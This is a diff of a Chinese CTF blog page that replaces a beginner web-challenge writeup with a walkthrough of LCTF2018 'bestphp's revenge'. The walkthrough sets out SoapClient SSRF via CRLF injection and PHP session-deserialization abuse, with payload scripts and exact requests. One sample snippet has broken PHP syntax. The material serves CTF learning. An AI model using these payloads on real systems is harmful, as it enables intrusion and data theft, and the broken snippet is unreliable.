@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>攻防世界web新手区Writeup | 甜筒园</title>
+  <title>bestphp&#39;s revenge | 甜筒园</title>
   <meta name="keywords" content="">
-  <meta name="description" content="攻防世界web新手区Writeup | 甜筒园">
+  <meta name="description" content="bestphp&#39;s revenge | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="XPath注入一、语法选取节点   表达式 描述    nodename 选取此节点的所有子节点。   &#x2F; 从根节点选取（取子节点）。   &#x2F;&#x2F; 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置（取子孙节点）。   . 选取当前节点。   .. 选取当前节点的父节点。   @ 选取属性。   在下面的表格中，我们已列出了一些路径表达式以及表达式的结果：">
 <meta property="og:type" content="article">
@@ -369,9 +369,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-攻防世界web新手区" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-bestphps-revenge" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">攻防世界web新手区Writeup</h1>
+        <h1 class="article-title">bestphp&#39;s revenge</h1>
     
     <div class="article-meta">
         
@@ -389,12 +389,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-07 16:47:35'>2022-01-16 18:17</time>
+            Created At : <time class="date" title='Updated At: 2023-03-14 19:53:14'>2022-03-14 19:17</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:967</span>
+        <span>Count:1.5k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -424,7 +424,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-view-source"><span class="toc-text">1.view_source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-robots"><span class="toc-text">2.robots</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-backup"><span class="toc-text">3.backup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-cookie"><span class="toc-text">4.cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-disabled-button"><span class="toc-text">5.disabled_button</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-weak-auth"><span class="toc-text">6.weak_auth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-simple-php"><span class="toc-text">7.simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-get-post"><span class="toc-text">8.get_post</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-xff-referer"><span class="toc-text">9.xff_referer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-webshell"><span class="toc-text">10.webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-command-execution"><span class="toc-text">11.command_execution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-simple-js"><span class="toc-text">12.simple_js</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bestphp%E2%80%99s-revenge"><span class="toc-text">bestphp’s revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php%E5%86%85%E7%BD%AE%E7%B1%BBSoapClient"><span class="toc-text">1.php内置类SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CRLF-Injection%E6%BC%8F%E6%B4%9E"><span class="toc-text">2. CRLF Injection漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-call-user-func"><span class="toc-text">3.call_user_func</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-PHPsession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">4.PHPsession 反序列化</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -440,121 +440,133 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a><strong>1.view_source</strong></h2><p>​	打开网址后发现界面是这样的：</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337257429804/c48ca26711041ce6b377a0befa6dcb3a652fd62e.png"></p>
-<p>尝试F12打开开发人员工具查看源代码：</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337266415701/4580b305547d1319884eb4f917e366b855c7ccaa.png"></p>
-<p>正好发现flag藏在这里，结束。</p>
-<hr>
-<h2 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h2><p>根据题目提示，尝试在url后添加<code>robots.txt</code></p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337270586804/41af69a2d2ca215fe4d5ebafe4a4ed058fbd3e72.png"></p>
-<p>发现flag藏在<code>f1ag_1s_h3re.php</code>中</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337274176910/66505fc87236a60b7c38486c98d899b6ea3208e2.png"></p>
-<p>END</p>
-<hr>
-<h2 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h2><p>题目提示是找到<code>index.php</code>的备份文件，百度查了一下如果网站存在备份文件，常见的备份文件后缀名有：“.git” ，“.svn”，“ .swp” ，“.~”，“.bak”，“.bash_history”，“.bkf”。 在URL后面，依次尝试输入常见的文件备份扩展名。<br>等到输入”.bak”时,弹出提示下载文件：</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337277251854/960900cc7106375ce18ad46c1ecd479a7acd5c2e.png"></p>
-<p>在文本中找到flag，下一个。</p>
-<hr>
-<h2 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h2><p>URL后加上<code>cookie.php</code>后</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337279665584/68420d03034b257110dba633dfeade3e5c00974e.png"></p>
-<p>用Burp Suite连接查看response</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337282095832/0c681ca1ddc74464d96a4d9972c0313a4c346a8d.png"></p>
-<p>找到flag，冲冲冲。</p>
-<hr>
-<h2 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h2><p>打开界面发现有个按钮按不下去，F12查看源代码，发现有一个<code>disabled</code>，双击选中删掉后，按一下flag就出来了。</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337284604808/0245a10357484c706bb99ab2381567b960ddb303.png"></p>
-<p>是不是很简单？</p>
-<hr>
-<h2 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h2><p>打开网址发现是一个登陆界面，随便输入用户名和密码后，提示我用户名为<code>admin</code>。试了多个万能密码后，都不对，看来只能用字典爆破了，题目说是随便设了个简单密码，假设为6位数字好了，<del>相信玄学</del>。</p>
-<p>用Burp Suite进行连接，在Raw界面下右键选择<code>Send to Intruder</code></p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337288478170/e982cd648b38cfa72ab429afd5335a31f0090c49.png"></p>
-<p>将密码位置处理成爆破点：</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337290502777/5a194cb5c60cffa5e6bd87a87c1a7a5220141b16.png"></p>
-<p>在这里修改爆破字典内容，然后点击<code>start attack</code>:</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337292904553/f56dcae28f1aa856a8619bed1b2085704f04a600.png" alt="image-20220116172329761"></p>
-<p>这里得跑一会了，不要着急</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1642337295816255/456acab6a5cff4ef9cedec6e1833608e59eca923.png" alt="image-20220116172655564"></p>
-<p> 从大到小排序后发现123456长度与别的不同，找到密码了。回到页面输入账号密码得到flag。</p>
-<hr>
-<h2 id="7-simple-php"><a href="#7-simple-php" class="headerlink" title="7.simple_php"></a>7.simple_php</h2><p>拿到题目后，根据php代码判断需要通过GET方式传入a和b的值，a要求等于0但不为0，b要求不能是数字还要大于1234，然后简单处理一下传入a和b的值就可以了</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643003998280754/8bbe82a308e586c6216c67f90bb45dea23994e66.png" alt="image-20220124135958020"></p>
-<p>bingo！</p>
-<hr>
-<h2 id="8-get-post"><a href="#8-get-post" class="headerlink" title="8.get_post"></a>8.get_post</h2><p>题如其名，就是考基本的get和post，get直接在url后添加就可</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643004410771707/2f5690c734d1401511e07fde43479f79b38fe6f4.png" alt="image-20220124140650625"></p>
-<p>post就需要postman来帮忙了<del><em>火狐的话直接post就好</em></del></p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643004515333934/a2d9c4e9f7fdfa49f5392dc2a4382543a2998218.png" alt="image-20220124140835207"></p>
-<hr>
-<h2 id="9-xff-referer"><a href="#9-xff-referer" class="headerlink" title="9.xff_referer"></a>9.xff_referer</h2><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643005782270065/c36aa1eb8084da1227115735c9ef2b5959e04a4d.png" alt="image-20220124142942126"></p>
-<p>话不多说，Burpsuite直连</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643005885218603/62a6553fca3bb2b928af859b0099ba4585b530bb.png" alt="image-20220124143125096"></p>
-<p>右键选择Send to Repeater</p>
-<p>这里添加一个X-Forwarded-For值为123.123.123.123</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006290936597/03ed8bb4b85a6e88d8298ee9ab853cbda3f66670.png" alt="image-20220124143810840"></p>
-<p>点击Go,查看相应里多了一行字</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006386292746/d3f008065aed3648868a4f1efa3cde270052d0aa.png" alt="image-20220124143946193"></p>
-<p>再添加个Referer值为<code>https://www.google.com</code></p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006462021974/5155af739e93260e367897dc4018263fd121a4e5.png" alt="image-20220124144101892"></p>
-<p>找到flag。</p>
-<hr>
-<h2 id="10-webshell"><a href="#10-webshell" class="headerlink" title="10.webshell"></a>10.webshell</h2><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006686797527/28bab5f4d1edcb0d29cafb41df65a8281c8cb69f.png" alt="image-20220124144446656"></p>
-<p>webshell就需要请出来菜刀来解决他了，先用post传一句话木马</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006788105981/a2b8ee1817303705cbb12c93e8978af82489e810.png" alt="image-20220124144627982"></p>
-<p>拿菜刀连一下</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006841616193/a741fdddeb9323ed77d6e671bf1fd3d79bd64377.png" alt="image-20220124144721522"></p>
-<p>有个flag文本，直接搞定</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006902853672/f2d823611f3de38e76c2b9747c8c68dafb2c2214.png" alt="image-20220124144822742"></p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643006922808057/a3853337d6a36610c3aff59dd369f3c71129ca0d.png" alt="image-20220124144842696"></p>
-<hr>
-<h2 id="11-command-execution"><a href="#11-command-execution" class="headerlink" title="11.command_execution"></a>11.command_execution</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/91837257">https://blog.csdn.net/qq_41617034/article/details/91837257</a></p>
-<p>参考这个博客学习一下有关命令执行的知识再来做题</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643007333604888/8e758e88b7c42f047127fa598afd7b6189030628.png" alt="image-20220124145533469"></p>
-<p>先试试本地地址127.0.0.1：</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643007387089454/1f4508231af64b14a349c24178dee9965b10e57c.png" alt="image-20220124145626953"></p>
-<p>已知flag在flag.txt中了，直接找一下</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643007655779380/dfe596a629d226c76b6ed163fb0e99918faf9061.png" alt="image-20220124150055685"></p>
-<p>注意斜杠后要有空格</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643007738427800/6d52014e9b3c92d07536f421ac1993af3e23c98e.png" alt="image-20220124150218330"></p>
-<p>找到目录</p>
-<p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643007805389534/29da258dc281f3b05b021c6de3698bb4fd14b583.png" alt="image-20220124150325273"></p>
-<p>搞定</p>
-<hr>
-<h2 id="12-simple-js"><a href="#12-simple-js" class="headerlink" title="12.simple_js"></a>12.simple_js</h2><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1643009372440033/54c62e8f4c327c6e8600e6dac60768967b68418f.png" alt="image-20220124152932298"></p>
-<p>提示输入密码，随便试试，密码不对，F12查看源代码：</p>
-<pre><code class="javascript">
-    function dechiffre(pass_enc)&#123;
-        var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;
-        var tab  = pass_enc.split(&#39;,&#39;);
-                var tab2 = pass.split(&#39;,&#39;);var i,j,k,l=0,m,n,o,p = &quot;&quot;;i = 0;j = tab.length;
-                        k = j + (l) + (n=0);
-                        n = tab2.length;
-                        for(i = (o=0); i &lt; (k = j = n); i++ )&#123;o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
-                                if(i == 5)break;&#125;
-                        for(i = (o=0); i &lt; (k = j = n); i++ )&#123;
-                        o = tab[i-l];
-                                if(i &gt; 5 &amp;&amp; i &lt; k-1)
-                                        p += String.fromCharCode((o = tab2[i]));
-                        &#125;
-        p += String.fromCharCode(tab2[17]);
-        pass = p;return pass;
-    &#125;
-    String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));
+        <h1 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h1><p>题目源码:</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$b = &#39;implode&#39;;
+call_user_func($_GET[&#39;f&#39;], $_POST);
+session_start();
+if (isset($_GET[&#39;name&#39;])) &#123;
+  $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];
+&#125;
+var_dump($_SESSION);
+$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
+call_user_func($b, $a);
 
-    h = window.prompt(&#39;Enter password&#39;);
-    alert( dechiffre(h) );
+//flag.php(扫目录扫的)
+only localhost can get flag!session_start();
+echo &#39;only localhost can get flag!&#39;;
+$flag = &#39;LCTF&#123;*************************&#125;&#39;;
+if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;
+       $_SESSION[&#39;flag&#39;] = $flag;
+   &#125;
+only localhost can get flag!
 </code></pre>
-<p>代码审计一波，把16进制的</p>
-<pre><code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30
-</code></pre>
-<p>转换为10进制</p>
-<pre><code>55,56,54,79,115,69,114,116,107,49,50
-</code></pre>
-<p>转换为ASCII码</p>
-<pre><code>786OsErtk12
-</code></pre>
-<p>根据题目提示flag格式为Cyberpeace{xxxxxxxxx}，提交Cyberpeace{786OsErtk12}得到正确答案。</p>
+<p>先来学习一些知识点：</p>
 <hr>
+<h3 id="1-php内置类SoapClient"><a href="#1-php内置类SoapClient" class="headerlink" title="1.php内置类SoapClient"></a>1.php内置类SoapClient</h3><p>​         SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1999159/202101/1999159-20210127114912726-2133757689.jpg"></p>
+<p>​         第一个参数的意思是：控制是否是wsdl模式，如果为NULL，就是非wsdl模式.如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，第二个参数的意思是：一个数组，里面是soap请求的一些参数和属性。</p>
+<p><strong>简单的用法</strong></p>
+<pre><code class="php">&lt;?php
+$a = new SoapClient(null,array(location&#39;=&gt;&#39;http://127.0.0.1/flag.php&#39;,&#39;uri&#39;=&#39;http://127.0.0.1/&#39;));
+$b = serialize($a);
+echo $b;
+$c = unserialize($b);
+$c-&gt;a();
+</code></pre>
+<p>​        可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> （当调用对象中不存在的方法会自动调用此方法）方法来进行 <strong>SSRF</strong></p>
+<h3 id="2-CRLF-Injection漏洞"><a href="#2-CRLF-Injection漏洞" class="headerlink" title="2. CRLF Injection漏洞"></a>2. CRLF Injection漏洞</h3><p>​        <strong>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</strong><br><strong>简单来说</strong><br><strong>http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</strong></p>
+<pre><code class="php">&lt;?php
+$target = &quot;http://127.0.0.1/flag.php&quot;;
+$options = array(
+    &quot;location&quot; =&gt; $target,
+    &quot;user_agent&quot; =&gt; &quot;ttycp3\r\nCookie: PHPSESSID=114514\r\n&quot;,
+    &quot;uri&quot; =&gt; &quot;demo&quot;
+);
+$attack = new SoapClient(null,$options);
+$payload = serialize($attack);
+unserialize($payload)-&gt;ff(); // 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求
+?&gt;
+</code></pre>
+<h3 id="3-call-user-func"><a href="#3-call-user-func" class="headerlink" title="3.call_user_func"></a>3.call_user_func</h3><p><strong>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</strong></p>
+<p>先传入<code>extract()</code>，将<code>$b</code>覆盖成回调函数，这样题目中的 <code>call_user_func($b,$a)</code> 就可以变成 <code>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</code> ，即调用 <strong>SoapClient</strong> 类不存在的 <strong>welcome_to_the_lctf2018</strong> 方法，从而触发 <strong>__call</strong> 方法发起 <strong>soap</strong> 请求进行 <strong>SSRF</strong> 。</p>
+<h3 id="4-PHPsession-反序列化"><a href="#4-PHPsession-反序列化" class="headerlink" title="4.PHPsession 反序列化"></a>4.PHPsession 反序列化</h3><pre><code>session.save_handler  session保存形式。默认为files
+
+session.save_path    session保存路径
+
+session.serialize_handler  session序列化存储所用处理器。默认为php
+</code></pre>
+<p>session中有三种序列化处理器处理session的情况</p>
+<pre><code class="php">&lt;?php 
+
+session_start();
+
+$_SESSION[&#39;name&#39;]=&#39;ttycp3&#39;;
+</code></pre>
+<pre><code class="php">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值
+    
+php 键名+竖线（|）+经过serialize()函数处理过的值
+    
+php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化
+    
+    
+例如：    
+当 session.serialize_handler=php 时，session文件内容为： name|s:6:&quot;ttycp3&quot;;  
+
+当 session.serialize_handler=php_serialize 时，session文件为： a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;ttycp3&quot;;&#125;
+
+当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符names:6:&quot;ttycp3&quot;;
+</code></pre>
+<p>使用不同引擎就会发生漏洞，通常是先使用php_serialize进行序列化，然后php默认引擎进行反序列化，这是因为<strong>php引擎反序列化时，|被当做分隔符</strong></p>
+<p>例如</p>
+<p>php_serialize引擎  a:1:{s:4:”name”;s:9:”|username”;}</p>
+<p>php  就会反序列化username ，前面是键名，后面是键值</p>
+<p>所以我们只需要传入$_SESSION[‘name’] &#x3D; |序列化内容</p>
+<hr>
+<p>接下来分析题目:</p>
+<p>​          flag.php 文件中告诉我们，只有 127.0.0.1 请求该页面才能得到 flag ，所以这明显又是考察 SSRF 漏洞，这里我们便可以利用 SoapClient 类的 __call 方法来进行 SSRF</p>
+<p>第一步：由于 PHP 中的原生 SoapClient 类存在 CRLF 漏洞，所以我们可以伪造任意 header ，构造 <strong>SoapClient</strong> 类，并用php_serialize引擎进行序列化，存入session</p>
+<p>​        这里还用到一个知识点：<strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。</strong></p>
+<p> 脚本构造：</p>
+<pre><code class="php">&lt;?php
+$target=&#39;http://127.0.0.1/flag.php&#39;;
+$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,
+    &#39;user_agent&#39; =&gt; &quot;ttycp3\r\nCookie:PHPSESSID=123456\r\n&quot;,
+    &#39;uri&#39; =&gt; &quot;http://127.0.0.1/&quot;));
+
+$se = serialize($b);
+echo &quot;|&quot;.urlencode($se);
+
+//注意下，这个脚本想要执行，需要将php.ini里的extension=soap前面的分号去掉
+</code></pre>
+<p> 执行后得到</p>
+<pre><code>|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A33%3A%22ttycp3%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+</code></pre>
+<p>传参：</p>
+<pre><code class="html">GET:
+f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A33%3A%22ttycp3%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+
+POST:
+serialize_handler=php_serialize
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314193907764.png" alt="image-20230314193907764"></p>
+<p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法</p>
+<p>传值f&#x3D;extract&amp;name&#x3D;SoapClient POST:b&#x3D;call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 。</p>
+<p>传参：</p>
+<pre><code>GET:
+f=extract&amp;name=SoapClient
+POST:
+b=call_user_func
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314194523209.png" alt="image-20230314194523209"></p>
+<p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p>
+<p>传参：</p>
+<pre><code>Cookie:PHPSESSID=123456
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314194729913.png" alt="image-20230314194729913"></p>
+<p><strong>参考</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/14335370.html">bestphp’s revenge[详解]</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
